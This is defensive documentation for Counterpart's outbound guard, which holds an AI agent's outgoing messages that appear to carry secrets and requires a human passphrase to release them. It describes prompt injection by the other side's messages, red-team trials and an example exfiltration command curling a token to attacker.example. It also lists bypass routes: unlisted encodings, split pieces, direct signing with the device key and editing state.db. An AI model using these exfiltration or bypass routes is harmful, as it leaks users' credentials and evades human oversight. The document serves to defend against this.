# Outbound guard

Your agent reads the other side's messages, and a message can be written to talk it into something. An agent with shell access could be talked into pasting a key into `counterpart_say`. The outbound guard is code in your daemon's library that checks everything your side sends before it is encrypted: messages, thread goals, contract proposals and their attachments, decline reasons, evidence, and your front desk's replies. A message that looks like it carries a secret is held, not sent. Whoever sent it is told the reason, never the value that matched. You decide.

It is a filter in front of one channel, not a sandbox. An agent with a shell can send a secret some other way. See [What it does not catch](#what-it-does-not-catch).

## What is checked

- **Keys and tokens of known shapes.** The gitleaks rule set (217 rules: cloud keys, GitHub, Slack, Stripe, Anthropic and the rest, JWTs, private key blocks, keys assigned to secret-looking names), plus a few of our own: a private key header with no body, an OpenSSH key body without its header, PuTTY keys, Azure connection strings, passwords in URLs.
- **Your environment.** The exact values of variables with secret-looking names (`*TOKEN*`, `*SECRET*`, `*PASSWORD*`, `*API_KEY*`, any name with `KEY` or `PASS` as a word of its own, `DATABASE_URL`, `CPART_PASSPHRASE` and so on; names ending in `_ID`, `_PATH`, `_FILE` and the like are left out), in the environment of the program that is sending: the `cpart` command, or `cpart mcp` started by Claude Code or Codex. A URL counts when it has a password, when its user name looks like a key, or when a secret-named variable holds it and a part of it looks like a key (a webhook URL with a token in its path). A local database URL with a stock password (`postgres://orders:orders@localhost:5432/orders`) does not count. Values are read when a message is checked and never stored.
- **.env files.** Values in `.env`, `.env.*` and `*.env` files in the repository the sending program runs in, and in any repository you add with `cpart guard repo add <path>`. Stand-ins are left out: `REPLACE_ME`, `changeme`, `TODO`, `your-key-here`, `<key>`, `${VAR}`, `xxxxxx` and the like. In templates (`.env.example`, `.env.sample`, `.env.template` and so on) a value counts only when it looks like a key: one token of ten or more characters, not words. A real key committed to `.env.example` still counts. Files are read again when they change. The search skips `node_modules`, `.git`, build output and the like, and stops at 12 directories deep or 20,000 directories. Where it stopped early, `cpart guard` says NOT CHECKED for that repository and the sending program warns once; it does not hold messages over it, or in a large repository nothing could be sent.
- **Config and credential files.** In the same repositories, values under secret-named keys (`token: ...`, `"api_key": "..."`, `password = ...`) in YAML, TOML, JSON, INI, `.properties`, XML and files named `credentials` or `secrets*`, up to 256 KB and 200 values a file. Only values that look like a key count. Test, fixture, example, sample and docs directories, lockfiles and package manifests are skipped: they are full of prose under names like `auth`. In the sending program's home directory: `~/.aws/credentials`, `~/.netrc`, `~/.pgpass`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc` and `~/.docker/config.json`. A value read from these files is known exactly, so it is held reversed or in halves too; a key recognised only by its shape is not.
- **Never-share files.** `cpart guard never-share add <file>` holds any message that quotes about forty letters and digits in a row from that file, however spaced or cased, and any key-like token in it. Files up to 4 MB. If the file later goes missing, becomes a link, cannot be read or grows past 4 MB, every message is held as `never-share-unreadable` until you restore it or remove it from the list.

Exact values and never-share text are also caught when they are written:

- reversed; in base64 (either alphabet, wrapped, nested), hex, percent-encoding, base32, decimal character codes, HTML character references, octal escapes, binary, UTF-16, gzip or zlib, rot13, `\u` escapes or full-width letters; or spelled out ("Alfa Kilo India, three", "k as in Kilo", one character a line)
- split with spaces, dashes, line breaks, zero-width characters, or as `"abc" + "def"`
- in part: eight characters' worth of a random-looking value (sixteen or more letters and digits), in runs of six that have a letter and a digit, or runs of twelve with at least nine different characters when there is no digit. Only what follows the value's fixed prefix counts: a vendor's (`sk_live_`, `ghp_`, `xoxb-`, `AKIA` and others) or one or two short lowercase words ending in `_` or `-`. So `sr_live_wC65` carries four characters of the key and is sent; `sr_live_wC65Tq9L` carries eight and is held
- in pieces with words between them, and spread over messages: the last eight messages to the same contact in the last day (up to 64,000 characters) count towards the eight. This part runs again inside the database transaction that commits the message, so two messages sent at the same moment cannot each carry half

Each encoded run is decoded up to four levels deep, and every reading is also reversed, joined, rot13'd and unescaped and decoded again, within bounds that grow with the length of the text. Compressed data is inflated up to 1 MB. If a bound is reached, the message is held as `too-much-to-check` rather than sent half-checked. Patterns are matched against the decoded forms too, so a base64 JWT is held.

## What happens to a held message

```
$ cpart say maya "here is the token: Zt4m..."
cpart: held for your human, reason: env-secret. Nothing was sent. Your human can review it with: cpart held

$ cpart held
we9QeSUDoC6B  2026-11-17 21:39:31  maya   talk.posted   generic-secret, env-secret  here is the [...]

$ cpart release we9QeSUDoC6B
Held we9QeSUDoC6B at 2026-11-17 21:39:31: talk.posted to maya in thread DL7h7EM6b95-4lidyEI0RA
Why: a value that looks like a secret; the value of a secret-named variable in the sending program's environment

  text:
    here is the token: Zt4m...
  matched: the value of a secret-named variable in the sending program's environment ($ORDERS_SERVICE_TOKEN), written as it is, characters 20 to 47: Zt4m...

Releasing sends all of the above to maya, exactly as shown. It cannot be called back.
Your passphrase:
```

- `cpart held [--all]` lists what is held, with the matching part blanked out. `--all` adds released, dropped and unguarded ones. `cpart status` shows the count.
- `cpart release <id>` shows the whole message and what matched, and sends it as written once you type your passphrase. It reads the passphrase from the keyboard only, ignores `CPART_PASSPHRASE`, and refuses to run without a terminal. So an agent running commands on your machine, which does not know your passphrase, cannot release its own message.
- `cpart drop <id>` throws it away. It needs your passphrase at the terminal too, so an agent cannot hide its own attempt.
- Adding or removing a never-share file, and removing a repository, need the passphrase at the terminal. Otherwise an agent could add a file and delete it, and stop all sending. Adding a repository does not.
- An identity made with `--no-passphrase` cannot release or turn the guard off: nothing would tell its owner from an agent that can drive a terminal. Drop and the list changes are allowed without asking there, so an agent with a shell can remove a protection too.
- Through MCP, the sending tools return an error that starts `Not sent: held for your human, reason: ...` and asks the agent not to reword or encode it. A held front desk reply is recorded as a failed run and not tried again.
- Accepting an invite whose token looks like it was made from a secret is refused; the token would go back to whoever made the invite.

The held message stays in `state.db` until you release or drop it; then its text is deleted.

Categories: `private-key`, `cloud-credential`, `jwt`, `api-token`, `generic-secret`, `env-secret`, `dotenv-value`, `never-share-file`, `too-much-to-check`, `never-share-unreadable`.

## Turning it off

`cpart guard off <minutes>` turns the guard off for every program that sends as this identity, for up to 8 hours. It needs your passphrase at a terminal. The passphrase unlocks your root key, which signs the end time, and the guard checks that signature on every message, so writing a row into `state.db` by hand does not turn it off. `cpart guard on` turns it back on early and needs nothing.

While it is off, every message prints `COUNTERPART OUTBOUND GUARD IS OFF` on standard error, and one the guard would have held is recorded (without its text) and counted in `cpart guard`, `cpart status` and `cpart held --all`.

There is no environment variable to turn it off: an agent with a shell could set it. Tests that build a node in code can pass `guard: { off: true }`.

## How well it does

Measured with `node scripts/guard-measure.ts` on 2026-11-17 and again on 2026-11-18, with the same results ([verification.md](verification.md)).

| Set | Size | Result |
| --- | --- | --- |
| Ordinary agent-to-agent messages that must pass | 1221 | 0 held |
| of which a held-out batch written after tuning, checked before any change for it | 273 | 2 held (0.7%), both `Idempotency-Key: <uuid>`. Fixed, then 0 |
| Planted secrets: 9 values (3 environment, 4 .env, 2 never-share lines) in 22 encodings; 4 of them cut into pieces 3 ways; the never-share file rewrapped; 17 key shapes in 4 encodings | 279 | 279 held |
| gitleaks' own true-positive samples, 219 rules | 6041 | 6016 held (99.6%). Of the 25 missed, 23 belong to rules that match on a file's path, which a message does not have |
| gitleaks' false-positive samples (strings one rule must not match) | 277 | 14 held by some other check. For information |

Only encodings on the guard's own list were planted, so the 279 show the list works, not that it is complete. Review later found bypasses the planted set did not have: reversed base64, base64 of rot13, base64 nested four deep, pieces sent one per message, pieces hidden in long padding, two halves sent at the same moment, a webhook URL in an environment variable, an invite token made from a secret, a never-share file deleted after it was added. Each is a test now and is held.

The ordinary messages are 400 made from templates (UUIDs, commit hashes, digests, base64 of plain JSON and PNG bytes, URLs, stack traces, JSON, OpenAPI, SQL, `.env.example` files, curl with `$TOKEN`), 161 paragraphs of this repository's docs, and 660 written by claude-sonnet-5-5 when asked for ordinary messages between two developers' agents that talk about tokens and keys without containing any. They are in `packages/daemon/test/guard-corpus/ordinary.json`; `scripts/guard-corpus-build.ts` makes it.

How often the piece check holds ordinary text by chance, with `node scripts/guard-stress.ts 1000` on 2026-11-18: the 1221 ordinary messages were checked against random keys of eight shapes (`sk_live_`, `sr_live_`, `ghp_`, `pt_`, `svc_`, `AKIA`, a bare 40-character key, 32 hex digits) in the sending program's environment. Then pieces of each key were sent alone in a sentence.

| Threshold (characters after the prefix) | Ordinary messages held | Prefix and first 6 | Prefix and first 8 | Prefix and first 10 | Prefix, 4 and the last 4 | 8 from the middle |
| --- | --- | --- | --- | --- | --- | --- |
| 6 (300 keys) | 5 | 260 of 300 | 277 of 300 | 293 of 300 | 1 of 300 | 238 of 300 |
| 8, chosen (1000 keys) | 0 | 1 of 1000 | 792 of 1000 | 940 of 1000 | 1 of 1000 | 651 of 1000 |
| 10 (300 keys) | 0 | 0 of 300 | 1 of 300 | 271 of 300 | 0 of 300 | 0 of 300 |
| Ten, counting the prefix (300 keys) | 0 | 88 of 300 | 174 of 300 | 267 of 300 | 0 of 300 | 1 of 300 |

Eight was chosen: at six, five ordinary messages were held by chance; at ten, one planted case was no longer held. Eight random characters are not always held, because a run of six with no digit is not counted.

Against a live agent, see [redteam.md](redteam.md): in 154 trials the model never tried to send a planted secret, so the guard had nothing real to hold. The scripted leaker there, which sends seven secrets in disguise, has six held.

## What it does not catch

- **Anything that does not go through Counterpart.** An agent talked into `curl https://attacker.example/?k=$TOKEN` is not stopped. The guard only means Counterpart is not the way out.
- **An agent with a shell that sets out to bypass it.** The device key in `keys.json` can sign messages without `cpart` at all, and the agent can edit `state.db`, for example to delete the record of a held message. While the guard is off, an agent can copy the signed row and write it back after `cpart guard on`; that keeps it off until the end time you signed, not longer. Keep the time short.
- **An agent that knows the passphrase.** If `CPART_PASSPHRASE` is set where the agent runs, it can type it into `cpart release` through a pseudo-terminal. Do not set it outside scripts.
- **Secrets the guard does not know.** A password in no environment variable, `.env`, config, credential or never-share file, with no known shape. A key that exists only in git history is one: the red team's scripted leak spells an old `sk_live_` key over three messages, and it gets through. Short values: environment and `.env` values under eight characters, words without digits under twelve, all-digit values under twelve.
- **Pieces that are too small.** Fewer than eight characters of a value after its fixed prefix; eight whose runs of six have no digit; pieces of a value under sixteen characters or one that is not random-looking (a passphrase made of words); pieces shorter than six characters unless they have a digit or capital inside and are sent in order; encoded pieces shorter than an encoded run the guard decodes. Never-share text under about forty letters and digits in a row.
- **Encodings not on the list.** Known to get through: a Caesar shift other than rot13, a filler character after each one, the even positions then the odd, encryption, other compression, other bases, homoglyphs, a description ("the third character is a capital Q").
- **Splits across contacts or older than a day,** more than eight messages back, or beyond 64,000 characters of earlier messages.
- **Secrets outside the MCP server's environment.** The environment check sees what `cpart mcp` was started with. Claude Code 2.1.327 on Linux passes its whole environment to a stdio MCP server, and an `env` entry adds to it rather than replacing it. A secret that exists only in a shell the agent opens later (`export` in a Bash tool call, a `.envrc` loaded there) is checked only if it is also in a file the guard reads. Codex was not checked.
- **Weak values in templates.** In `.env.example` and other templates, a value that is words or shorter than ten characters does not count, even if it is a real password. In any `.env` file, a value that contains a stand-in word (`example`, `changeme`, `replace_me`, `your-`, `TODO`) does not count.
- A rule set can be wrong both ways: a new kind of token is missed, and an ordinary message nobody thought of is held. Releasing a false hold costs a passphrase.

Nothing here has run on macOS or Windows.

## Where things are

- `packages/daemon/src/guard.ts`: the checks and the held table. The hooks are in `Counterpart.post`, `Counterpart.openThread` and `Counterpart.acceptInvite`.
- `packages/daemon/src/guard-data/gitleaks-rules.json`: the rules, generated by `scripts/guard-vendor-gitleaks.py` from gitleaks v8.30.1 (`python3 -I scripts/guard-vendor-gitleaks.py <gitleaks source> v8.30.1`). It converts Go regex syntax to JavaScript and leaves out the five rules that only apply to file paths.
- `packages/daemon/test/guard-corpus/`: the corpus, the planted secrets, and gitleaks' test samples (random parts regenerated with a fixed seed).
- `packages/cli/src/guard-cli.ts`: `cpart held`, `release`, `drop`, `guard`.
- `scripts/guard-smoke.sh`: a relay, two daemons, the CLI and the MCP server as real processes.
- `scripts/guard-measure.ts` (`--verbose` prints what was held or missed) and `scripts/guard-stress.ts [keys]`: the tables above.
- `scripts/guard-redteam.sh`: a live Claude Code session asked for a `.env` secret, guard on and off. Uses real models.
- Gauntlet cases `GRD-01` to `GRD-10` play a fooled agent directly.

## Credit

The patterns come from [gitleaks](https://github.com/gitleaks/gitleaks), MIT License, Copyright (c) 2019 Zachary Rice. Its `gitleaks:allow` comment is not honoured here: whoever writes the message could add it.
